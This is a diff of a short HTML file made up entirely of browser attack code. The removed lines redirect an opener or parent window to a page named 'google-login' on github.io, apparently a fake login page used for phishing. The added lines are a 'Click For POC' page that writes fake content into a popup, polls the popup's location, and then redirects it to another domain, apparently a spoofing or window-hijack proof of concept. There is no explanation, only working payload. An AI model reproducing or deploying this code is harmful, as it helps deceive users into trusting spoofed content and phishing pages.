@@ -1,7 +1,18 @@
 <html>
-<script>
-if (window.opener) window.opener.parent.location.replace('https://muhnabil04.github.io/google-login/');
-if (window.parent != window) window.parent.location.replace('https://muhnabil04.github.io/google-login/');
+ <head>
+  <script>
+  function next() {
+         w.location.replace('https://microsoft.com:88');
+        }
+
+  function f() {
+    w = window.open("javascript:document.write('<h1>This is a Fake Content!</h1>');location='http://yatra.com'");
+
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
+  }
 </script>
-blah
+ </head>
+ <body>
+  <center><a href="#" onclick="f()">Click For POC</a></center>
+ </body>
 </html>
